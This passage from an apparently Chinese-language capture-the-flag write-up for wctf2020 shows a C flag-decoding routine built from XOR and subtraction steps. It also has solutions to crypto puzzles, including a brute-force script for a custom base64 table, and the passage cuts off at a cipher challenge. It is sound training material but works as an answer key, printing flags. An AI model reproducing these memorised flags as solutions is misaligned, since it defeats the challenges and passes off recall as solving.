class="string">'\x10'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x14'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x1f'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x1c'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'6'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x1a'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'N'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\"'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'-'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\r'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'Q'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'b'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x16'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'L'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">']'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'$'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'0'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'H'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x03'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'_'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\\'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x12'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'3'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x19'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'#'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\''</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'?'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'X'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x13'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'.'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'R'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'B'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x1b'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'/'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'1'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x1d'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'&gt;'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x17'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x02'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'M'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x0f'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'%'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'('</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x04'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'K'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x0e'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'E'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'='</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'*'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'4'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'I'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x06'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'8'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'`'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'G'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'C'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'2'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'D'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'a'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">' '</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'7'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'V'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'^'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\v'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'!'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'+'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'&amp;'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x11'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'J'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\n'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'T'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\f'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'F'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">','</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'Y'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'U'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">')'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'5'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'A'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'9'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'Z'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x01'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">':'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">';'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'S'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'W'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'c'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x05'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\t'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'['</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'\x1e'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'O'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'@'</span>;</span><br><span class="line">    tmp = tmp - <span class="string">'P'</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x67</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x68</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xc3</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x23</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xe9</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">8</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x3b</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x50</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xfa</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">100</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">200</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">5</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xf5</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x76</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x86</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x41</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x99</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xf0</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x37</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x49</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x4c</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x18</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x39</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x5d</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x2c</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x75</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x4d</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x95</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xed</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x84</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x10</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x32</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">2</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x12</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x9c</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x65</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x73</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x2f</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x13</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xc</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xbd</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x96</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xa8</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x33</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xd2</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xe2</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">199</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xd3</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x4e</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xa9</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xf9</span>;</span><br><span class="line">    tmp = ~tmp;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xef</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x62</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x66</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xce</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x14</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xb</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xb6</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">7</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xa3</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x97</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xdc</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xb8</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xe7</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xd5</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x7f</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x82</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x34</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xe1</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x98</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xe3</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xf6</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xeb</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xd8</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xda</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x1d</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x9d</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x7d</span>;</span><br><span class="line">    tmp = tmp - <span class="number">-0x80</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xc9</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x27</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xa0</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x8e</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xf7</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x6f</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xfb</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x9a</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x9b</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xcb</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xd4</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x30</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xac</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x60</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x92</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xaf</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x2d</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xab</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x51</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xb7</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x35</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xd0</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xa4</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xad</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xc0</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xec</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xbe</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xfc</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xbb</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x54</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xc5</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xc1</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xc6</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">3</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xde</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x5e</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x3a</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xfd</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x29</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x31</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x85</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x2b</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xb9</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x55</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xdf</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xcf</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x4b</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xcc</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x1f</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xd6</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x93</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xf</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xe0</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xd1</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xb0</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xf1</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x56</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xf4</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x45</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">99</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x7c</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x2e</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x11</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x81</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x1c</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x77</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xfe</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x3f</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x36</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x87</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xbf</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xba</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x8b</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xa7</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x26</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x5f</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x72</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xdb</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x47</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x4a</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x15</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x19</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xb4</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x7b</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x8a</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">9</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xe8</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x71</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x20</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x88</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xe6</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x46</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x25</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xee</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xa5</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x8f</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x43</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x1a</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x5b</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xd9</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x61</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x79</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xa6</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xb3</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x8c</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x90</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x44</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x3d</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xc2</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x22</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x6b</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xa2</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x1e</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x6d</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x57</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x74</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">1</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xbc</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x94</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x2a</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x7e</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xe5</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x21</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x5c</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x69</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xb1</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x5a</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x17</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xd</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xb5</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xd7</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x16</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x89</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x40</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x6e</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xe4</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x48</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xea</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x28</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x70</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x78</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">6</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xa1</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x3c</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x9f</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xf2</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x58</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xf8</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xae</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xaa</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x1b</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x52</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xdd</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x7a</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x38</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x8d</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xe</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x42</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x9e</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">4</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x53</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xc4</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x83</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x24</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x4f</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x6c</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x3e</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xca</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xf3</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">10</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x59</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x6a</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0xcd</span>;</span><br><span class="line">    tmp = tmp ^ <span class="number">0x91</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> code[] = &#123;<span class="string">'\xD9'</span>,<span class="string">'\x2C'</span>,<span class="string">'\x27'</span>,<span class="string">'\xD6'</span>,<span class="string">'\xD8'</span>,<span class="string">'\x2A'</span>,<span class="string">'\xDA'</span>,<span class="string">'\x2D'</span>,<span class="string">'\xD7'</span>,<span class="string">'\x2C'</span>,<span class="string">'\xDC'</span>,<span class="string">'\xE1'</span>,<span class="string">'\xDB'</span>,<span class="string">'\x2C'</span>,<span class="string">'\xD9'</span>,<span class="string">'\xDD'</span>,<span class="string">'\x27'</span>,<span class="string">'\x2D'</span>,<span class="string">'\x2A'</span>,<span class="string">'\xDC'</span>,<span class="string">'\xDB'</span>,<span class="string">'\x2C'</span>,<span class="string">'\xE1'</span>,<span class="string">'\x29'</span>,<span class="string">'\xDA'</span>,<span class="string">'\xDA'</span>,<span class="string">'\x2C'</span>,<span class="string">'\xDA'</span>,<span class="string">'\x2A'</span>,<span class="string">'\xD9'</span>,<span class="string">'\x29'</span>,<span class="string">'\x2A'</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag&#123;"</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; ++i)&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> c = de(code[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>, c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&#125;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="大树运算"><a href="#大树运算" class="headerlink" title="大树运算"></a>大树运算</h2><p>题目：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag等于 wctf2020&#123;Part1-Part2-Part3-Part4&#125; 每一Part都为数的十六进制形式（不需要0x)，并用 &#39;-&#39; 连接</span><br><span class="line">Part1 &#x3D; 2020×2019×2018× ... ×3×2×1 的前8位</span><br><span class="line">Part2 &#x3D; 520^1314 + 2333^666 的前8位</span><br><span class="line">Part3 &#x3D; 宇宙终极问题的答案 x, y, z绝对值和的前8位</span><br><span class="line">Part4 &#x3D; 见图片附件，计算结果乘上1314</span><br></pre></td></tr></table></figure></div><p>算出来就行（part4那个是一个定积分 x^2 | 22,0 ）</p><h2 id="B-se"><a href="#B-se" class="headerlink" title="B@se"></a>B@se</h2><p>base64换表，但是表缺了4个字节，不多，直接爆破就行。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">a = <span class="string">'JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs****kxyz012789+/'</span></span><br><span class="line">b = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">c = <span class="string">'MyLkTaP3FaA7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD'</span></span><br><span class="line">l = [<span class="string">''</span>.join(i) <span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(set(b)-set(a),<span class="number">4</span>)] </span><br><span class="line">ll = [a.replace(<span class="string">'****'</span>,i) <span class="keyword">for</span> i <span class="keyword">in</span> l]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span><span class="params">(table)</span>:</span>                 </span><br><span class="line">    l = [table.index(i) <span class="keyword">for</span> i <span class="keyword">in</span> c]</span><br><span class="line">    s = [bin(i)[<span class="number">2</span>:].rjust(<span class="number">6</span>,<span class="string">'0'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> l]</span><br><span class="line">    <span class="keyword">print</span> (hex(int(<span class="string">''</span>.join(s),<span class="number">2</span>))[<span class="number">2</span>:<span class="number">-1</span>]+<span class="string">'0'</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ll:</span><br><span class="line">    d(i)</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    <span class="keyword">print</span> <span class="string">''</span></span><br></pre></td></tr></table></figure></div><blockquote><p>flag: wctf2020{base64_1s_v3ry_e@sy_and_fuN}</p></blockquote><h2 id="情书"><a href="#情书" class="headerlink" title="情书"></a>情书</h2><p>题目：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Premise: Enumerate the alphabet by 